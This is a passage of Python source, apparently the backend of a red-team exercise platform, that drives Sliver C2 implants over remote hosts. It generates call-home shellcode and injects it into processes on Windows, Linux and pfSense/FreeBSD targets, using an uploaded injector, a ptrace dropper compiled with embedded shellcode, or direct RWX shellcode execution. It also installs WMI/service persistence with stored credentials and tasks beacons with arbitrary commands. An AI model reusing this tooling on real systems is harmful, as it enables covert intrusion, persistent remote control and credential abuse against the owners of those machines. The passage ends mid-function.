    # Generate fresh shellcode via Sliver gRPC so the beacon's mTLS cert is
    # registered with the current server. Static shellcode_win.bin contains a
    # beacon compiled weeks ago whose cert has typically been evicted from
    # /root/.sliver/sliver.db by clean_stale_implants.sh (1-day threshold),
    # causing the callback to be rejected silently. Fall back to the static
    # file only if gRPC generation fails.
    # Use C2_IP first (the implant call-home address), same as every other
    # generate path — SLIVER_HOST is only the fallback. Previously this used
    # SLIVER_HOST directly, so an inject c2_url could diverge from the address
    # the beacon/session implants use (docs/PLAN_implant_deploy_live_fire_fixes.md B).
    c2_url = f"mtls://{config.C2_IP or config.SLIVER_HOST}:{config.MTLS_LISTENER_PORT}"
    # OS-derived goos: default "windows" for legacy inject targets, but
    # linux/firewall IOCs need shellcode built for their kernel or the target
    # process seg-faults on the first instruction (proven 2026-09-11 with
    # firewall_self_inject dropper returning rc=3: Windows shellcode baked
    # into a FreeBSD ptrace injector runs a nonsense byte stream, target
    # process signal-11's out). Sliver's freebsd path is handled by
    # _generate_inject_shellcode's own goos="freebsd" branch (stage0 + .so).
    _INJECT_GOOS_BY_IOC_OS = {
        "windows": "windows",
        "linux": "linux",
        "firewall": "freebsd",
    }
    inject_goos = _INJECT_GOOS_BY_IOC_OS.get(getattr(ioc, "os", None), "windows")
    shellcode_bytes: bytes | None = None
    try:
        shellcode_bytes = await _generate_inject_shellcode(c2_url, goos=inject_goos)
        logger.info(
            "inject: generated fresh %s shellcode (%d bytes) via gRPC for %s",
            inject_goos, len(shellcode_bytes), box_ip,
        )
    except Exception as exc:
        logger.warning("inject: fresh shellcode generate failed (%s); falling back to shellcode_win.bin", exc)
        shellcode_path = Path(config.PROJECT_ROOT) / "iocs" / "payloads" / "shellcode_win.bin"
        if not shellcode_path.exists():
            update_box_progress(task_id, box_ip, "failed",
                                error=f"shellcode generate failed ({exc}) and shellcode_win.bin not found")
            finish_task(task_id, "failed")
            return
        shellcode_bytes = await asyncio.to_thread(shellcode_path.read_bytes)

    client = _get_sliver_client()

    try:
        interact = await client.interact_session(session_id)
    except Exception as exc:
        update_box_progress(task_id, box_ip, "failed", error=f"session interact failed: {exc}")
        finish_task(task_id, "failed")
        return

    if not interact:
        update_box_progress(task_id, box_ip, "failed", error="Session not found")
        finish_task(task_id, "failed")
        return

    # Handle stc variant: upload spoolmon.exe + shellcode, then execute
    is_stc = ioc.name == "windows_implant_inject_stc"
    # FreeBSD/pfSense self_inject IOCs (firewall_self_inject{,_devd}) can't
    # use Sliver's execute_shellcode RPC — Sliver's FreeBSD support ships
    # without it (UNIMPLEMENTED gRPC). But we already build a standalone
    # ptrace-inject dropper for each (implant_src/self_inject_freebsd.c via
    # shim_builder), so bake the fresh shellcode into the dropper via
    # shim_builder + upload + execute — mirrors the STC pattern.
    is_freebsd_dropper = (
        getattr(ioc, "os", None) == "firewall"
        and ioc.name in {"firewall_self_inject", "firewall_self_inject_devd"}
    )

    # Get target PID via ps(). Sliver SDK versions differ: newer returns an
    # iterable of Process protobufs; older returns a Ps wrapper with
    # `.Processes`.  Handle both shapes here — without this, on the newer SDK
    # `getattr(list, "Processes", [])` yielded an empty list and the inject
    # path always reported `<target> not found in process list`.
    #
    # Retry a few times: a just-connected session's process list can be
    # transiently empty/incomplete on the first ps() round-trip immediately
    # after callback, even though the caller already confirmed the target
    # process exists via a separate, slower-polled /sessions/{id}/ps check.
    # Without this, inject-shellcode intermittently fast-fails against a
    # session that's genuinely fine seconds later.
    target_pid = None
    ps_error: Exception | None = None
    for _ps_attempt in range(5):
        try:
            ps_result = await interact.ps()
            iterable = getattr(ps_result, "Processes", None)
            if iterable is None:
                iterable = ps_result if hasattr(ps_result, "__iter__") else []
            target_pid = _select_inject_pid(list(iterable), target_process)
            ps_error = None
        except Exception as exc:
            ps_error = exc
            # Sliver on FreeBSD returns gRPC UNIMPLEMENTED for ps() — the
            # only affected inject IOCs today are firewall_self_inject /
            # firewall_self_inject_devd (pfSense targets). Fall back to a
            # `pgrep -l -f <target>` via interact.execute (works cross-OS on
            # any target with pgrep, which pfSense/FreeBSD/Linux all have).
            # Parse the "<pid> <cmdline>" listing into duck-typed Process
            # stand-ins so _select_inject_pid's exact-name match + critical-
            # process reject still runs. Absorb the ps() exception on the
            # first successful fallback — a downstream ps_error only fires
            # if BOTH ps() and pgrep failed.
            try:
                fallback = await _fallback_pgrep_procs(interact, target_process)
                target_pid = _select_inject_pid(fallback, target_process)
                if target_pid is not None or fallback:
                    ps_error = None
            except Exception as pgrep_exc:
                # Keep the original ps() error as the primary — pgrep-fallback
                # failure is a secondary signal.
                logger.debug(
                    "_bg_inject_shellcode: pgrep fallback for %r on session %s failed (%s); "
                    "keeping ps() error as primary",
                    target_process, session_id, pgrep_exc,
                )
        if target_pid is not None:
            break
        await asyncio.sleep(2)
    if ps_error is not None:
        update_box_progress(task_id, box_ip, "failed", error=f"ps() failed: {ps_error}")
        finish_task(task_id, "failed")
        return
    if target_pid is None:
        # Also reached when every match was rejected as critical (see
        # _select_inject_pid) — failing the deploy is the correct outcome there;
        # injecting into a critical process bugchecks the box.
        update_box_progress(task_id, box_ip, "failed",
                            error=f"no safe pid for {target_process} in process list")
        finish_task(task_id, "failed")
        return

    try:
        if is_stc:
            # Upload spoolmon.exe and shellcode_win.bin, then execute
            from sqlalchemy.orm import Session as _Session  # lazy-load

            from fastapi_backend.database.db_writer import (
                engine as _engine,  # lazy-load
            )

            stc_path = None
            with _Session(_engine) as _db:
                try:
                    stc_path = await _resolve_ioc_payload("spoolmon.exe", "windows", _db)
                except PayloadResolutionError as exc:
                    update_box_progress(task_id, box_ip, "failed", error=str(exc))
                    finish_task(task_id, "failed")
                    return

            stc_remote = f"C:\\Windows\\Temp\\spoolmon_{session_id[:8]}.exe"
            sc_remote = f"C:\\Windows\\Temp\\shellcode_{session_id[:8]}.bin"

            # Best-effort remove leftover artefacts from prior runs — Sliver
            # Upload defaults to error-on-exist and the SDK in use here does
            # not accept an `overwrite` kwarg.  rm() returns gracefully when
            # the file is missing.
            for stale in (stc_remote, sc_remote):
                try:
                    await interact.rm(stale)
                except Exception:
                    pass
            _stc_bytes = await asyncio.to_thread(stc_path.read_bytes)
            await interact.upload(stc_remote, data=_stc_bytes)
            await interact.upload(sc_remote, data=shellcode_bytes)

            exec_result = await interact.execute(stc_remote, [str(target_pid), sc_remote], output=True)
            if exec_result.Status != 0:
                stderr = exec_result.Stderr.decode(errors="replace") if exec_result.Stderr else ""
                update_box_progress(task_id, box_ip, "failed",
                                    error=f"spoolmon failed: {stderr or 'exit code ' + str(exec_result.Status)}")
                finish_task(task_id, "failed")
                return
        elif is_freebsd_dropper:
            # Build the dropper with the fresh shellcode + target-process comm
            # baked in (shim_builder caches by (source, defines) so a repeat
            # with identical shellcode is a no-op recompile). Upload via
            # Sliver session, chmod +x, execute foreground — the dropper does
            # PT_ATTACH / PT_IO / PT_SETREGS on syslogd itself and returns 0
            # on successful injection. Same lifecycle as the STC branch
            # above, but the "on-box injector" is our own ptrace binary
            # instead of Sliver's Windows-only execute_shellcode RPC.
            import base64  # cycle-break

            from fastapi_backend.c2 import shim_builder  # cycle-break

            defines = {
                "SHELLCODE_B64": base64.b64encode(shellcode_bytes).decode("ascii"),
                "INJECT_TARGET_COMM": target_process,
            }
            try:
                dropper_path = await asyncio.to_thread(
                    shim_builder.build_shim, ioc.name, defines, force=True,
                )
            except shim_builder.ShimBuilderError as exc:
                update_box_progress(task_id, box_ip, "failed",
                                    error=f"freebsd dropper build failed: {exc}")
                finish_task(task_id, "failed")
                return

            dropper_remote = f"/tmp/c3r_si_{session_id[:8]}"
            try:
                await interact.rm(dropper_remote)
            except Exception:
                pass
            dropper_bytes = await asyncio.to_thread(dropper_path.read_bytes)
            await interact.upload(dropper_remote, data=dropper_bytes)
            # pfSense root FS is read-only; remount rw so /tmp writes and
            # any self-delete inside the dropper succeed. Matches the
            # existing firewall_self_inject_deploy.sh preamble.
            await interact.execute("/sbin/mount", ["-uw", "/"], output=True)
            await interact.execute("chmod", ["+x", dropper_remote], output=True)
            exec_result = await interact.execute(dropper_remote, [], output=True)
            if exec_result.Status != 0:
                stderr = exec_result.Stderr.decode(errors="replace") if exec_result.Stderr else ""
                update_box_progress(task_id, box_ip, "failed",
                                    error=f"freebsd dropper failed: rc={exec_result.Status} {stderr[:200]}")
                finish_task(task_id, "failed")
                return
        else:
            # Direct execute_shellcode via Sliver gRPC. rwx=True allocates
            # PAGE_EXECUTE_READWRITE — required for Donut/Sliver shellcode which
            # is self-decoding/decompressing and cannot run from PAGE_EXECUTE_READ.
            await interact.execute_shellcode(shellcode_bytes, rwx=True, pid=target_pid)

        update_box_progress(
            task_id, box_ip, "done",
            details=json.dumps({"pid_injected": target_pid, "ioc_name": ioc.name}),
        )
        update_task_metadata(task_id, {"ioc_name": ioc.name, "pid_injected": target_pid})

        # Resolve pooled artifact names (e.g. SVC_NAME for windows_implant_inject)
        # ONCE, so the DeployedIOCs row records them AND the persistence deploy
        # below injects the SAME C3R_<KEY>. The other three deploy paths already do
        # this; without it the persistence script (now fail-loud on a missing
        # pooled name) reports failure and the inject never fully materialises.
        # deploy_dir="" — the inject has no on-disk drop dir (shellcode into svchost).
        inj_pool_params = await _resolve_implant_pool_params(
            box_ip=box_ip, box_os=ioc.os, ioc_name=ioc.name, deploy_dir="",
        )

        # Auto-register DeployedIOCs for the inject. The new Sliver session
        # spawned by the shellcode has a fresh server-assigned name that
        # doesn't match any IOC.check.implant_identifier — so the disconnect/
        # connect event handler in sliver_manager wouldn't auto-register it.
        # The inject path already knows the box_ip + IOC; insert directly.
        try:
            from fastapi_backend.database.models import (  # cycle-break
                DeployedIOCs as _DI,
            )
            from fastapi_backend.database.models import (
                assign_blue_team_label,
            )
            _inj_dp = json.dumps(inj_pool_params) if inj_pool_params else None

            def _auto_register(db: Session) -> None:
                existing = db.execute(
                    select(_DI).where(
                        _DI.box_ip == box_ip,
                        _DI.ioc_name == ioc.name,
                    )
                ).scalars().first()
                if existing is None:
                    label = assign_blue_team_label(db, ioc.os, ioc.difficulty)
                    db.add(_DI(
                        box_ip=box_ip,
                        ioc_name=ioc.name,
                        persistence_mechanism=getattr(ioc.persistence, "name", None) if ioc.persistence else None,
                        blue_team_label=label,
                        deployed_at=dt.datetime.now(dt.UTC),
                        deployed_by=operator,
                        status="active",
                        source="auto",
                        difficulty=ioc.difficulty,
                        deploy_params=_inj_dp,
                    ))
                elif existing.status in ("lost", "failed"):
                    existing.status = "active"
                    existing.implant_identifier = None  # reset so new beacon backfills
                    existing.deployed_at = dt.datetime.now(dt.UTC)
                    # Record the freshly-resolved pooled name so check/remediate
                    # re-inject the SAME C3R_<KEY> this redeploy actually used.
                    if _inj_dp:
                        existing.deploy_params = _inj_dp
                else:
                    # status='active' from a prior run (e.g. crashed before finally
                    # block could DELETE). Reset identifier so _backfill_inject_identifier
                    # picks up the new beacon instead of scoring a dead one.
                    existing.implant_identifier = None
                    existing.deployed_at = dt.datetime.now(dt.UTC)
                    if _inj_dp:
                        existing.deploy_params = _inj_dp

            await write_actor.submit(_auto_register, label="inject_auto_register")
        except Exception as exc:
            logger.warning("inject auto-register failed for %s on %s: %s", ioc.name, box_ip, exc)

    except Exception as exc:
        update_box_progress(task_id, box_ip, "failed", error=f"inject failed: {exc}")
        finish_task(task_id, "failed")
        return

    # Apply persistence post-deploy if IOC has persistence
    inject_persist_err: str | None = None
    if ioc.persistence:
        from sqlalchemy.orm import Session as _Session  # lazy-load

        import iocs.persistence as _pm_mod  # lazy-load
        from fastapi_backend.core.implant_ops import (
            _apply_persistence_post_deploy,  # lazy-load
            persistence_step_failed,  # lazy-load
        )
        from fastapi_backend.database.db_writer import engine as _db_engine  # lazy-load
        from fastapi_backend.netexec.wrapper import protocol_for_box  # lazy-load
        from fastapi_backend.utils.nxc_routing import _get_best_cred  # lazy-load

        persistence_attr_name = None
        for k, v in vars(_pm_mod).items():
            from iocs.base import PersistenceMechanism  # lazy-load
            if v is ioc.persistence and isinstance(v, PersistenceMechanism):
                persistence_attr_name = k
                break

        if persistence_attr_name:
            try:
                nxc = _get_nxc_wrapper()
                # Resolve the ACTUAL box OS, not the IOC's nominal one. A pivoted
                # session can surface with box_ip pointing at its pfSense relay
                # (GET /c2/sessions falls back to matching Boxes.box_ip against the
                # relay address when session_id and Hostname both miss), so
                # ioc.os="windows" would ask for an SMB cred on a firewall box that
                # only has ssh creds -- reported as the misleading "no credential to
                # apply inject persistence" rather than the real mismatch.
                with _Session(_db_engine) as _osdb:
                    _box_row = query_one(_osdb, Boxes, box_ip=box_ip)
                    _actual_os = (_box_row.os or "") if _box_row else ""
                box_os = _actual_os or ioc.os
                os_mismatch = bool(
                    _actual_os and ioc.os and _actual_os.lower() != ioc.os.lower()
                )
                cred = None
                _derived_cred: tuple[str, str] | None = None
                if not os_mismatch:
                    protocol, _ = protocol_for_box(box_os)
                    with _Session(_db_engine) as _db:
                        cred = _get_best_cred(
                            box_ip, _db, protocol=protocol, include_invalid=True,
                            scoring_only=config.RED_SCORING_ENABLED,
                        )
                    if cred is None and config.RED_SCORING_ENABLED:
                        # The seeded red_scoring infra cred ROW can be transiently
                        # ABSENT under the test harness's per-worker inventory
                        # rebinding: reload_inventory prunes every non-slice box + its
                        # creds then reseeds, and an inject deploy landing in that
                        # window finds no row (include_invalid can't help — the row is
                        # deleted, not invalidated). Derive it IN-MEMORY from inventory
                        # (no DB write — avoids racing the single writer actor and the
                        # DB-lock flake that can cause) so a scored inject IOC does not
                        # hard-fail on that harness race. No-op in prod (one full-
                        # inventory backend seeds the row once).
                        from fastapi_backend.utils.dependencies import (
                            get_orchestrator,  # cycle-break
                        )
                        _derived_cred = get_orchestrator().derive_scoring_cred(box_ip)
                if os_mismatch:
                    inject_persist_err = (
                        f"box/IOC OS mismatch: {box_ip} is os={_actual_os!r} but "
                        f"{ioc.name} targets os={ioc.os!r} — the session's box_ip "
                        "likely resolved to a pivot relay rather than the real host"
                    )
                elif cred or _derived_cred:
                    _cred_user = cred.username if cred else _derived_cred[0]
                    _cred_pass = cred.password if cred else _derived_cred[1]
                    inj_hook = await _apply_persistence_post_deploy(
                        nxc=nxc,
                        box_ip=box_ip,
                        box_os=box_os,
                        username=_cred_user,
                        password=_cred_pass,
                        binary_remote_path="",
                        persistence_attr_name=persistence_attr_name,
                        apply_immutable=apply_immutable,
                        immutable_scope=immutable_scope,
                        # Inject the pooled SVC_NAME/WMI_BASE_NAME (resolved above) so
                        # the fail-loud persistence deploy script gets its C3R_<KEY>.
                        deploy_params=inj_pool_params or None,
                    )
                    # F1: inject persistence (WMI/dll/service) is the scored
                    # artifact — a failure here means the IOC did not fully
                    # materialise; surface it as a task failure.
                    inject_persist_err = persistence_step_failed(
                        inj_hook, requested=True,
                    )
                else:
                    inject_persist_err = "no credential to apply inject persistence"
            except Exception as exc:
                logger.warning("Persistence post-inject failed for %s: %s", ioc.name, exc)
                inject_persist_err = f"persistence post-inject raised: {exc}"

    if inject_persist_err:
        update_box_progress(task_id, box_ip, "failed", error=f"persistence: {inject_persist_err}")
        finish_task(task_id, "failed")
        return

    finish_task(task_id, "done")


@router.delete("/sessions/{session_id}")
async def kill_session(session_id: str, current_user: Users = Depends(require_non_blue)) -> dict[str, Any]:
    """Kill an active Sliver session (graceful, then force if still alive after 30s)."""
    if config.DEV_MODE:
        def _mark_dead(db: Session) -> None:
            row = db.get(DevSession, session_id)
            if row:
                row.is_dead = True

        await write_actor.submit(_mark_dead, label="kill_session_dev")
        from fastapi_backend.c2.sliver_manager import sliver_manager  # lazy-load
        await sliver_manager.publish({"type": "session-removed", "id": session_id})
        return {"status": "killed"}
    client = _get_sliver_client()
    interact = await client.interact_session(session_id)
    if not interact:
        # Sliver doesn't know about the session anymore — still clear our
        # local Boxes.session_id row so listings stay consistent.
        def _clear_session(db: Session) -> None:
            box = db.execute(
                select(Boxes).where(Boxes.session_id == session_id)
            ).scalar_one_or_none()
            if box:
                box.session_id = None

        await write_actor.submit(_clear_session, label="kill_session_clear")
        return {"status": "already_dead", "id": session_id}
    # Record intentional kill before gRPC fires so the disconnect event handler
    # can distinguish this from an organic disconnect.
    def _record_kill(db: Session) -> None:
        db.merge(PendingKills(
            session_id=session_id,
            initiated_by=current_user.username,
            initiated_at=dt.datetime.now(dt.UTC).isoformat(),
        ))

    await write_actor.submit(_record_kill, label="kill_session_pending")

    try:
        await client.kill_session(session_id, force=False)
    except Exception as exc:
        # gRPC error almost always means session already disconnected on Sliver's
        # side between interact_session() and kill_session(). Clear local row,
        # report already_dead.
        logger.warning("kill_session(%s) raised — treating as already_dead: %s", session_id, exc)

        def _clear_session_on_err(db: Session) -> None:
            box = db.execute(
                select(Boxes).where(Boxes.session_id == session_id)
            ).scalar_one_or_none()
            if box:
                box.session_id = None

        await write_actor.submit(_clear_session_on_err, label="kill_session_clear_err")
        from fastapi_backend.c2.sliver_manager import sliver_manager  # lazy-load
        await sliver_manager.publish({"type": "session-removed", "id": session_id})
        return {"status": "already_dead", "id": session_id, "detail": str(exc)[:200]}
    # Poll up to 30s for session to disappear from Sliver's session list
    deadline = time.time() + 30
    while time.time() < deadline:
        await asyncio.sleep(2)
        try:
            live_sessions = await client.sessions()
            if not any(session_id == s.ID for s in live_sessions):
                break
        except Exception:
            break
    else:
        # Force kill if still alive after 30s
        with contextlib.suppress(Exception):
            await client.kill_session(session_id, force=True)
    from fastapi_backend.c2.sliver_manager import sliver_manager  # cycle-break
    await sliver_manager.publish({"type": "session-removed", "id": session_id})
    return {"status": "killed"}


@router.post("/sessions/kill-all", status_code=202)
async def kill_all_sessions(
    current_user: Users = Depends(require_non_blue),
) -> dict[str, Any]:
    """Kill every live Sliver session.

    Inserts PendingKills rows before issuing gRPC kill calls so the disconnect
    event handler treats them as intentional (flips auto-registered DeployedIOCs
    to status='lost'). Errors per-id are captured but do not abort the batch.
    """
    if config.DEV_MODE:
        def _kill_all_dev(db: Session) -> list[str]:
            rows = db.execute(
                select(DevSession).where(DevSession.is_dead == False)  # noqa: E712
            ).scalars().all()
            ids = [r.id for r in rows]
            for r in rows:
                r.is_dead = True
            return ids

        killed_ids = await write_actor.submit(_kill_all_dev, label="kill_all_sessions_dev")
        from fastapi_backend.c2.sliver_manager import sliver_manager  # lazy-load
        for sid in killed_ids:
            await sliver_manager.publish({"type": "session-removed", "id": sid})
        return {"status": "ok", "killed": len(killed_ids), "ids": killed_ids}

    client = _get_sliver_client()
    sessions = await client.sessions()
    ids = [s.ID for s in sessions if not getattr(s, "IsDead", False)]

    now_iso = dt.datetime.now(dt.UTC).isoformat()

    def _record_kills(db: Session) -> None:
        for sid in ids:
            db.merge(PendingKills(
                session_id=sid,
                initiated_by=current_user.username,
                initiated_at=now_iso,
            ))

    await write_actor.submit(_record_kills, label="kill_all_sessions_pending")

    async def _kill_one(sid: str) -> tuple[str, bool, str]:
        try:
            await client.kill_session(sid, force=False)
            return (sid, True, "")
        except Exception as exc:
            logger.warning("kill_all_sessions: %s kill raised: %s", sid, exc)
            return (sid, False, str(exc)[:200])

    results = await asyncio.gather(*[_kill_one(sid) for sid in ids])
    from fastapi_backend.c2.sliver_manager import sliver_manager  # cycle-break
    for sid, _, _ in results:
        await sliver_manager.publish({"type": "session-removed", "id": sid})

    return {
        "status": "ok",
        "killed": sum(1 for _, ok, _ in results if ok),
        "failed": sum(1 for _, ok, _ in results if not ok),
        "ids": ids,
    }


# ---------------------------------------------------------------------------
# Beacons (Sliver)
# ---------------------------------------------------------------------------

class BeaconExecRequest(BaseModel):
    """POST /c2/beacons/{id}/exec request body."""

    command: str
    args: list[str] = []


@router.get("/beacons")
async def list_beacons(
    include_dead: bool = Query(default=False),
    current_user: Users = Depends(require_non_blue),
) -> dict[str, Any]:
    """List Sliver beacons with box attribution."""
    if config.DEV_MODE:
        with Session(engine) as db:
            stmt = select(DevBeacon)
            if not include_dead:
                stmt = stmt.where(DevBeacon.is_dead == False)  # noqa: E712
            rows = db.execute(stmt).scalars().all()
            return {"beacons": [_dev_row_to_dict(r) for r in rows]}
    client = _get_sliver_client()
    from fastapi_backend.c2.serialize import serialize_beacon  # cycle-break

    beacons = await client.beacons()
    if not include_dead:
        beacons = [b for b in beacons if not getattr(b, "IsDead", False)]
    result = []
    with Session(engine) as db:
        for b in beacons:
            d = serialize_beacon(b)
            raw_addr = b.RemoteAddress or ""
            ip = raw_addr.split(":")[0] if raw_addr else None
            if ip:
                box = None
                if "->" in raw_addr:
                    from fastapi_backend.c2.sliver_manager import (  # cycle-break
                        box_by_hostname,
                    )
                    box = box_by_hostname(db, b.Hostname)
                if box is None:
                    box = db.execute(
                        select(Boxes).where(Boxes.box_ip == ip)
                    ).scalar_one_or_none()
                d["box_name"] = box.box_name if box else None
                d["team_num"] = box.team_num if box else None
                d["box_ip"] = box.box_ip if box else ip
            else:
                d["box_name"] = None
                d["team_num"] = None
                d["box_ip"] = None
            result.append(d)
    return {"beacons": result}


@router.get("/beacons/{beacon_id}")
async def get_beacon(beacon_id: str, current_user: Users = Depends(require_non_blue)) -> dict[str, Any]:
    """Return one Sliver beacon by id."""
    if config.DEV_MODE:
        with Session(engine) as db:
            row = db.get(DevBeacon, beacon_id)
            if not row:
                raise HTTPException(status_code=404, detail="Beacon not found")
            return _dev_row_to_dict(row)
    client = _get_sliver_client()
    from fastapi_backend.c2.serialize import serialize_beacon  # cycle-break

    beacons = await client.beacons()
    for b in beacons:
        if beacon_id == b.ID:
            return serialize_beacon(b)
    raise HTTPException(status_code=404, detail="Beacon not found")


@router.post("/beacons/{beacon_id}/exec")
async def task_beacon(
    beacon_id: str,
    body: BeaconExecRequest,
    current_user: Users = Depends(require_non_blue),
) -> dict[str, Any]:
    """Task a beacon to run a command. Returns task_id immediately."""
    if config.DEV_MODE:
        return {"task_id": f"dev-{uuid.uuid4()}", "state": "pending"}
    client = _get_sliver_client()
    parts = body.command.split()
    exe = parts[0] if parts else body.command
    args = body.args if body.args else parts[1:]

    interact = await client.interact_beacon(beacon_id)
    if not interact:
        raise HTTPException(status_code=404, detail="Beacon not found")

    # interact.execute() is wrapped by @beacon_taskresult: it queues the task via
    # gRPC, stores (asyncio.Future, pb_type) in interact.beacon_tasks keyed by the
    # real Sliver TaskID, then returns that Future.  The Future has no .ID attribute,
    # so we recover the TaskID by reverse-looking up which key maps to our future.
    future = await interact.execute(exe, args, output=True)
    sliver_task_id = next(
        (tid for tid, (fut, _) in interact.beacon_tasks.items() if fut is future),
        None,
    )

    # Phase 5 (exec-merge): persist OperatorTask(task_type='exec_single') with
    # implant_type='beacon' instead of legacy ExecTask.  Beacon-task drain
    # hooks into _consume_bulk_exec_hook (extended for exec_single).
    from fastapi_backend.c2.beacon_task_poller import (  # cycle-break
        register_bulk_exec_beacon_task,
    )
    from fastapi_backend.core.task_tracker import (  # cycle-break
        create_task,
        start_task,
        update_box_progress,
    )

    with Session(engine) as db:
        box = query_one(db, Boxes, beacon_id=beacon_id)
        box_ip = box.box_ip if box else "unknown"
        team_num = box.team_num if box else None

    operator_task_id = create_task(
        task_type="exec_single",
        operator=current_user.username,
        team_num=team_num,
        target_boxes=[box_ip],
        metadata={
            "implant_type": "beacon",
            "implant_id": beacon_id,
            "command": body.command,
            "args": args,
            "sliver_task_id": sliver_task_id,
        },
    )
    start_task(operator_task_id)
    update_box_progress(operator_task_id, box_ip, "waiting_beacon")

    # Register w/ beacon poller hook so drain writes per-box progress + finish.
    if sliver_task_id:
        register_bulk_exec_beacon_task(sliver_task_id, operator_task_id, box_ip)

    return {
        "operator_task_id": operator_task_id,
        "task_id": sliver_task_id,
        "sliver_task_id": sliver_task_id,
        "state": "pending",
    }


@router.get("/beacons/{beacon_id}/tasks")
async def get_beacon_tasks(beacon_id: str, current_user: Users = Depends(require_non_blue)) -> dict[str, Any]:
    """List tasks issued to a beacon, with output for completed entries."""
    if config.DEV_MODE:
        return {"tasks": []}
    client = _get_sliver_client()
    from fastapi_backend.c2.serialize import serialize_beacon_task  # cycle-break

    tasks = await client.beacon_tasks(beacon_id)
    result = []
    for t in tasks:
        d = serialize_beacon_task(t)
        # Fetch output for completed tasks
        if t.State in ("completed", "Completed"):
            try:
                content = await client.beacon_task_content(t.ID)
                if content:
                    d["stdout"] = content.Response.Stdout.decode(errors="replace") if content.Response and content.Response.Stdout else ""
                    d["stderr"] = content.Response.Stderr.decode(errors="replace") if content.Response and content.Response.Stderr else ""
            except Exception:
                pass
        result.append(d)
    return {"tasks": result}


@router.get("/beacons/{beacon_id}/tasks/{task_id}")
async def get_beacon_task(
    beacon_id: str,
    task_id: str,
    current_user: Users = Depends(require_non_blue),
) -> dict[str, Any]:
    """Return a single beacon task with stdout/stderr (if completed)."""
    if config.DEV_MODE:
        raise HTTPException(status_code=404, detail="Task not found")
    client = _get_sliver_client()
    from fastapi_backend.c2.serialize import serialize_beacon_task  # cycle-break

    try:
        content = await client.beacon_task_content(task_id)
    except Exception:
        raise HTTPException(status_code=404, detail="Task not found") from None

    if not content:
        raise HTTPException(status_code=404, detail="Task not found")

    d = serialize_beacon_task(content)
    if content.Response:
        d["stdout"] = content.Response.Stdout.decode(errors="replace") if content.Response.Stdout else ""
        d["stderr"] = content.Response.Stderr.decode(errors="replace") if content.Response.Stderr else ""
    return d


@router.post("/beacons/{beacon_id}/interactive")
async def interactive_beacon(
    beacon_id: str,
    current_user: Users = Depends(require_non_blue),
) -> dict[str, Any]:
    """Issue Sliver's OpenSession beacon task — spawns a linked session on next check-in.

    No dedicated sliver-py wrapper exists for this (see docs/PLAN_operator_ux.md
    § D) — issued as a raw stub call following the same pattern
    sliver_shell_dispatch._cmd_current_token_owner uses for other un-wrapped
    RPCs. The RPC only queues the task; the actual session shows up later via
    the normal session-connected event path (_auto_register_implant), same as
    any organic connect — no special-casing needed here.
    """
    if config.DEV_MODE:
        return {"task_id": f"dev-{uuid.uuid4()}", "state": "pending"}
    client = _get_sliver_client()
    interact = await client.interact_beacon(beacon_id)
    if not interact:
        raise HTTPException(status_code=404, detail="Beacon not found")

    from sliver.pb.sliverpb import sliver_pb2  # cycle-break

    from fastapi_backend.c2.sliver_shell_dispatch import _check_err  # cycle-break

    req = sliver_pb2.OpenSession()
    interact._request(req)
    result = await interact._stub.OpenSession(req)
    err = _check_err(result)
    if err:
        raise HTTPException(status_code=502, detail=f"OpenSession failed: {err}")

    from fastapi_backend.core.task_tracker import (  # cycle-break
        create_task,
        start_task,
        update_box_progress,
    )

    with Session(engine) as db:
        box = query_one(db, Boxes, beacon_id=beacon_id)
        box_ip = box.box_ip if box else "unknown"
        team_num = box.team_num if box else None

    operator_task_id = create_task(
        task_type="interactive",
        operator=current_user.username,
        team_num=team_num,
        target_boxes=[box_ip],
        metadata={"beacon_id": beacon_id},
    )
    start_task(operator_task_id)
    # Stays "waiting_beacon" — the new session shows up organically via the
    # session-connected event path once the beacon's next check-in processes
    # the queued task; this route's job is only confirming the RPC was
    # accepted, not waiting for the session to actually establish.
    update_box_progress(operator_task_id, box_ip, "waiting_beacon")

    return {"operator_task_id": operator_task_id, "state": "queued"}


@router.delete("/beacons/{beacon_id}")
async def kill_beacon(beacon_id: str, current_user: Users = Depends(require_non_blue)) -> dict[str, Any]:
    """Remove a beacon from Sliver's registry (RmBeacon), then publish beacon-removed SSE.

    Uses client.kill_beacon() (RmBeacon gRPC) rather than interact.terminate() so
    that sleeping and already-disconnected beacons can be removed without a 500.
    RmBeacon is a server-side operation — it succeeds regardless of whether the
    beacon is currently connected. The implant process on the remote host is left
    to expire naturally on next check-in (Sliver rejects unknown beacon IDs).
    """
    if config.DEV_MODE:
        def _mark_dead(db: Session) -> None:
            row = db.get(DevBeacon, beacon_id)
            if row:
                row.is_dead = True

        await write_actor.submit(_mark_dead, label="kill_beacon_dev")
        from fastapi_backend.c2.sliver_manager import sliver_manager  # lazy-load
        await sliver_manager.publish({"type": "beacon-removed", "id": beacon_id})
        return {"status": "killed"}
    client = _get_sliver_client()
    # Record intentional kill before gRPC fires so disconnect handler can
    # distinguish this from an organic disconnect.
    def _record_kill(db: Session) -> None:
        db.merge(PendingKills(
            session_id=beacon_id,
            initiated_by=current_user.username,
            initiated_at=dt.datetime.now(dt.UTC).isoformat(),
        ))

    await write_actor.submit(_record_kill, label="kill_beacon_pending")

    try:
        # RmBeacon is a server-side operation — succeeds regardless of whether
        # the beacon is currently connected or alive.  Skip the interact_beacon
        # pre-check: beacon_by_id scans beacons() which is a snapshot; a timing
        # race between process kill and this call can make the beacon transiently
        # absent from that snapshot even though it's still registered in Sliver.
        await client.kill_beacon(beacon_id)
    except Exception as exc:
        # RmBeacon raised — beacon not found or already removed.  Clean up the
        # PendingKills row we just inserted so it doesn't accumulate.
        def _cleanup_pending(db: Session) -> None:
            pk = db.get(PendingKills, beacon_id)
            if pk:
                db.delete(pk)

        await write_actor.submit(_cleanup_pending, label="kill_beacon_cleanup")
        logger.warning("kill_beacon(%s) raised — treating as already_dead: %s", beacon_id, exc)
        from fastapi_backend.c2.sliver_manager import sliver_manager  # lazy-load
        await sliver_manager.publish({"type": "beacon-removed", "id": beacon_id})
        return {"status": "already_dead", "id": beacon_id, "detail": str(exc)[:200]}
    from fastapi_backend.c2.sliver_manager import sliver_manager  # cycle-break
    await sliver_manager.publish({"type": "beacon-removed", "id": beacon_id})
    return {"status": "killed"}


@router.post("/beacons/kill-all", status_code=202)
async def kill_all_beacons(
    current_user: Users = Depends(require_non_blue),
) -> dict[str, Any]:
    """Remove every beacon from Sliver's registry.

    Same PendingKills semantics as kill_all_sessions — disconnect handler
    flips auto-registered DeployedIOCs to status='lost'.
    """
    if config.DEV_MODE:
        def _kill_all_dev(db: Session) -> list[str]:
            rows = db.execute(
